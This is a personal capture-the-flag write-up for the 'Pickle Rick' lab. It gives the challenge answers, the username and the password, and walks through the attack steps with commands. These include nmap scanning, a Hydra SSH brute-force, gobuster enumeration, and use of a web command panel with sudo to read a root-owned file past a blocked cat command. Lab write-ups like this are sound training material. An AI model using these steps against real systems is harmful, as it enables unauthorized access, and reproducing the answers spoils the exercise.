# Pickle Rick 🥒
Date: 04.02.2025
Difficulty: Easy

## Questions and Answers
1. What is the first ingredient that Rick needs?
```mr. meeseek hair```
2. What is the second ingredient in Rick’s potion?
```1 jerry tear```
3. What is the last and final ingredient?
```fleeb juice```

## Obtained Information:
- **Target IP Address:** `<IP_ADDRESS>`
- **Rick's Username:** `R1ckRul3s`
- **Password found inside robots.txt:** `Wubbalubbadubdub`

## Process:
1. Scanning target IP looking for open ports with nmap:
```bash
nmap -sV 10.10.130.148
```

**Results:**

- Open ports: `22 (SSH)`, `80 (HTTP)`

2. Exploring website running on port 80 server. There is a note that Rick left for Morty!
```text
Help Morty!
Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!
I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

3. Looking into source code of the website I bumped into comment:
```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```
Rick doesn't remember password, but maybe we can bruteforce it somehow.

4. When trying to bruteforce password with Hydra:
```bash
hydra -l R1ckRul3s -P ./Tools/wordlists/rockyou.txt "ssh://<IP_ADDRESS>"
```
I encountered information that target doesn't support password authentication. Indeed, login attempt using ssh results in ```Permission denied (publickey).```. Looks like we have to dig deeper.
5. Decided to use gobuster to enumerate website's directories:
```bash
gobuster dir -u "http://<IP_ADDRESS>" -w ./Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

**Results**
- /assets (Status: 200) ✅
- /server-status (Status: 403)

In assets I've found some bootstrap and jquery as well as images and gif. It seemed weird, because only one of these images is actually used on the website. So I decided to download them:

```bash
wget -r -np -nd -A jpg,jpeg,gif "http://<IP_ADDRESS>/assets/"
```
And inspect it's metadata via exiftool:
```bash
exiftool *.jpg *.jpeg *.gif
```
But nothing out of order there. Another dead end...
6. But wait, there is also a robots.txt.tmp file downloaded. And there is some weird text: `Wubbalubbadubdub`. Maybe it's a password?
7. Gobuster again. This time I added -x .php extension to look deeper:
```bash
gobuster dir -u "http://10.10.130.148" -w ./Tools/wordlists/dirbuster/directory-list-2.3-small.txt -x .js,.php
```

**Results**
- /.php                 (Status: 403)
- /login.php            (Status: 200) ✅
- /assets               (Status: 301) 
- /portal.php           (Status: 302) 
- /.php                 (Status: 403)

8. Using obtained username and password I got access to command panel. Used ```ls``` to see that there is some file named: `Sup3rS3cretPickl3Ingred.txt`. We can't access it via ```cat``` command so let's just view it via url:
   ```http://<IP_ADDRESS>/Sup3rS3cretPickl3Ingred.txt```
9. We got our first ingredient!
10. There is also a `clue.txt` which contains, well... a clue! 
```text
Look around the file system for the other ingredient.
```
11. Found file `second ingredient` in /home/rick/ directory! But we can't use cat again, so:
```bash
while read line; do echo $line; done <../../../home/rick/"second ingredients"
```
 And we got second ingredient!

12. `3rd.txt` file found /root directory. We had to use ```sudo``` to get access:
```bash
sudo ls ../../../root
```
13. This time we can omit ```cat``` command block with ```nl```:
```bash
sudo nl ../../../root/3rd.txt
```

And we got 3rd ingredient! That's all:
```text
     1	3rd ingredients: fleeb juice
```

## Reflection & Questions for Further Research 🤔💡
- What ```Permission denied (publickey).``` error means when using ssh?

## Summary & Takeaways 📌📖
- It's best to use -x when using gobuster dir enumeration, because it couldn't find login.php page 